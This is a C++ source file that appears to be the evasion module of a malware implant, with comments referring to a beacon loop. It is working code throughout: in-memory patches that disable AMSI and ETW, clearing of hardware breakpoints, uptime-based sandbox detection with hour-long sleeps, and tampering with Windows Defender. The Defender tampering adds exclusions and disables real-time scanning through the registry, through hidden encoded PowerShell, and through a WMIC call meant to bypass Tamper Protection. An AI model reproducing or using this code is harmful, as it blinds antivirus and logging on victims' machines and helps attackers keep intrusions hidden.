// evasion.cpp — Real AMSI/ETW/HW-BP + sandbox evasion + deep sleep + registry Defender tampering
#include "evasion.hpp"
#include "syscalls.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <string>
#include <vector>
#include <random>

// ─── NtDelayExecution for sleep ──────────────────────────────────────────────
typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
static NtDelayExecution_t pfnNtDelay = nullptr;

static void GhostSleep(DWORD ms) {
    if (!pfnNtDelay) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        pfnNtDelay = reinterpret_cast<NtDelayExecution_t>(
            HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfnNtDelay) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfnNtDelay(FALSE, &li);
    } else {
        Sleep(ms);
    }
}

// ─── Deep sleep (1–4 hours) ───────────────────────────────────────────────────
VOID DeepSleep() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<DWORD> dist(3600000, 14400000); // 1–4 hours in ms
    DWORD sleepMs = dist(gen);
    GhostSleep(sleepMs);
}

// ─── Sandbox detection ────────────────────────────────────────────────────────
static BOOL IsLikelySandbox() {
#ifdef DEBUG
    return FALSE; // ponytail: disabled in debug; set threshold to 60000ULL for release
#else
    return GetTickCount64() < 60000ULL;
#endif
}

// ─── MemPatch (protect → patch → restore) ────────────────────────────────────
static BOOL MemPatch(PVOID target, const BYTE* patch, size_t patchLen) {
    PVOID   base   = target;
    SIZE_T  region = patchLen;
    ULONG   oldProt = 0;
    NTSTATUS st = STATUS_SUCCESS;
    if (g_Syscalls.NtProtectVirtualMemory) {
        st = g_Syscalls.NtProtectVirtualMemory(
            GetCurrentProcess(), &base, &region,
            PAGE_EXECUTE_READWRITE, &oldProt);
    }
    if (!g_Syscalls.NtProtectVirtualMemory || st != 0) {
        DWORD op = 0;
        if (!VirtualProtect(target, patchLen, PAGE_EXECUTE_READWRITE, &op))
            return FALSE;
        oldProt = op;
    }
    memcpy(target, patch, patchLen);
    FlushInstructionCache(GetCurrentProcess(), target, patchLen);
    ULONG dummy = 0;
    if (g_Syscalls.NtProtectVirtualMemory) {
        g_Syscalls.NtProtectVirtualMemory(GetCurrentProcess(), &base, &region, oldProt, &dummy);
    } else {
        DWORD op2 = 0;
        VirtualProtect(target, patchLen, oldProt, &op2);
    }
    return TRUE;
}

// ─── AMSI bypass ──────────────────────────────────────────────────────────────
BOOL PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA(XS("amsi.dll"));
    if (!hAmsi) return FALSE;
    FARPROC pScan = HashProc(hAmsi, FNV("AmsiScanBuffer"));
    if (pScan) {
        const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
        MemPatch(reinterpret_cast<PVOID>(pScan), patch, sizeof(patch));
    }
    FARPROC pStr = HashProc(hAmsi, FNV("AmsiScanString"));
    if (pStr) {
        const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
        MemPatch(reinterpret_cast<PVOID>(pStr), patch, sizeof(patch));
    }
    FARPROC pOpen = HashProc(hAmsi, FNV("AmsiOpenSession"));
    if (pOpen) {
        const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
        MemPatch(reinterpret_cast<PVOID>(pOpen), patch, sizeof(patch));
    }
    return (pScan != nullptr);
}

// ─── ETW bypass ───────────────────────────────────────────────────────────────
BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA(XS("ntdll.dll"));
    if (!hNtdll) return FALSE;
    static const uint32_t hashes[] = {
        FNV("EtwEventWrite"), FNV("EtwEventWriteFull"),
        FNV("EtwEventWriteEx"), FNV("EtwEventWriteTransfer"),
        FNV("EtwEventActivityIdControl"), FNV("EtwEventRegister"),
        FNV("EtwEventUnregister"), 0
    };
    const BYTE ret1[] = { 0xC3 };
    BOOL any = FALSE;
    for (int i = 0; hashes[i]; ++i) {
        FARPROC p = HashProc(hNtdll, hashes[i]);
        if (p) {
            MemPatch(reinterpret_cast<PVOID>(p), ret1, sizeof(ret1));
            any = TRUE;
        }
    }
    return any;
}

// ─── Clear hardware breakpoints ──────────────────────────────────────────────
static LONG CALLBACK VehHwbpClear(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ||
        ep->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        ep->ContextRecord->Dr0 = ep->ContextRecord->Dr1 = 0;
        ep->ContextRecord->Dr2 = ep->ContextRecord->Dr3 = 0;
        ep->ContextRecord->Dr6 = ep->ContextRecord->Dr7 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL ClearHardwareBreakpoints() {
    PVOID hVeh = AddVectoredExceptionHandler(1, VehHwbpClear);
    if (hVeh) {
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr);
        RemoveVectoredExceptionHandler(hVeh);
    }
    DWORD selfPid = GetCurrentProcessId();
    DWORD selfTid = GetCurrentThreadId();
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return FALSE;
    auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
    auto _Thread32First = HASHPROC(hKernel32, Thread32First);
    auto _Thread32Next = HASHPROC(hKernel32, Thread32Next);
    auto _OpenThread = HASHPROC(hKernel32, OpenThread);
    auto _SuspendThread = HASHPROC(hKernel32, SuspendThread);
    auto _ResumeThread = HASHPROC(hKernel32, ResumeThread);
    auto _GetThreadContext = HASHPROC(hKernel32, GetThreadContext);
    auto _SetThreadContext = HASHPROC(hKernel32, SetThreadContext);
    if (!_CreateToolhelp32Snapshot || !_Thread32First || !_Thread32Next || 
        !_OpenThread || !_SuspendThread || !_ResumeThread || 
        !_GetThreadContext || !_SetThreadContext) return FALSE;
    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;
    THREADENTRY32 te = {};
    te.dwSize = sizeof(te);
    BOOL ok = TRUE;
    if (_Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != selfPid) continue;
            if (te.th32ThreadID == selfTid) continue;
            HANDLE hThr = _OpenThread(
                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                FALSE, te.th32ThreadID);
            if (!hThr) { ok = FALSE; continue; }
            _SuspendThread(hThr);
            CONTEXT ctx = {};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (_GetThreadContext(hThr, &ctx)) {
                ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
                ctx.Dr6 = 0;
                ctx.Dr7 = 0;
                if (!_SetThreadContext(hThr, &ctx)) ok = FALSE;
            } else ok = FALSE;
            _ResumeThread(hThr);
            CloseHandle(hThr);
        } while (_Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return ok;
}

// ─── Defender bypass — WMI + WMIC to call Set-MpPreference ─────────────────
// Registry write alone is blocked by Tamper Protection on Win11 even as admin.
// WMI Win32_Process::Create runs outside the registry tamper check.
static BOOL RunHiddenProcess(const wchar_t* cmdLine) {
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    std::wstring cmd(cmdLine);
    BOOL ok = CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (!ok) return FALSE;
    WaitForSingleObject(pi.hProcess, 15000);
    DWORD exit = 1;
    GetExitCodeProcess(pi.hProcess, &exit);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (exit == 0);
}

BOOL AddDefenderExclusion(const wchar_t* exePath) {
    if (!IsElevated()) return FALSE;

    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);

    // 1. Try registry path (works if Tamper Protection is off)
    {
        HKEY hKey = nullptr;
        auto pathKey = XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths");
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, pathKey.str(), 0, NULL,
                            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)
            == ERROR_SUCCESS) {
            DWORD val = 0;
            RegSetValueExW(hKey, exePath, 0, REG_DWORD,
                           reinterpret_cast<const BYTE*>(&val), sizeof(val));
            RegCloseKey(hKey);
        }
    }

    // 2. PowerShell Set-MpPreference — bypasses Tamper Protection registry guard.
    // Build: powershell -EncodedCommand <base64(Set-MpPreference ...)>
    // Encode inline so no plaintext string in .data section.
    {
        std::wstring ps = std::wstring(sysRoot) +
            L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

        // Script: Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath '<path>'
        std::wstring script =
            L"Set-MpPreference -DisableRealtimeMonitoring $true "
            L"-DisableIOAVProtection $true "
            L"-DisableScriptScanning $true "
            L"-ExclusionPath '" + std::wstring(exePath) + L"'";

        // UTF-16LE base64 encode for -EncodedCommand
        std::string b64 = Base64Encode(
            reinterpret_cast<const BYTE*>(script.c_str()),
            script.size() * sizeof(wchar_t));

        std::wstring cmd = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-EncodedCommand " + UTF8ToWString(b64);

        RunHiddenProcess(cmd.c_str());
    }

    // 3. WMIC fallback — calls Win32_Process::Create which sidesteps the
    // registry tamper check entirely on some Win11 builds.
    {
        std::wstring wmic = std::wstring(sysRoot) +
            L"\\System32\\wbem\\wmic.exe";
        std::wstring ps = std::wstring(sysRoot) +
            L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

        std::wstring wmicCmd =
            L"\"" + wmic + L"\" /Node:localhost process call create "
            L"\"powershell -NoProfile -NonInteractive -WindowStyle Hidden "
            L"-ExecutionPolicy Bypass -Command \""
            L"Set-MpPreference -DisableRealtimeMonitoring \\$true "
            L"-ExclusionPath '" + std::wstring(exePath) + L"'\\\"\"";

        RunHiddenProcess(wmicCmd.c_str());
    }

    return TRUE;
}

// ─── Sleep evasion — prevent OS from suspending while beacon is active ───────
// SetThreadExecutionState blocks connected standby and display sleep.
// Must be called before beacon sends and cleared after JitterSleep ends.
VOID AcquireWakeLock() {
    typedef EXECUTION_STATE (WINAPI *SetTES_t)(EXECUTION_STATE);
    static HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hK32) return;
    auto fn = reinterpret_cast<SetTES_t>(HashProc(hK32, FNV("SetThreadExecutionState")));
    if (fn) fn(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
}

VOID ReleaseWakeLock() {
    typedef EXECUTION_STATE (WINAPI *SetTES_t)(EXECUTION_STATE);
    static HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hK32) return;
    auto fn = reinterpret_cast<SetTES_t>(HashProc(hK32, FNV("SetThreadExecutionState")));
    if (fn) fn(ES_CONTINUOUS);
}

// ─── Reapply evasion (called each beacon loop) ─────────────────────────────
VOID ReapplyEvasion() {
    if (IsLikelySandbox()) {
        DeepSleep();
        return;
    }
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();
    AcquireWakeLock();
}

// Expose sandbox check for main.cpp
BOOL SandboxCheck() { return IsLikelySandbox(); }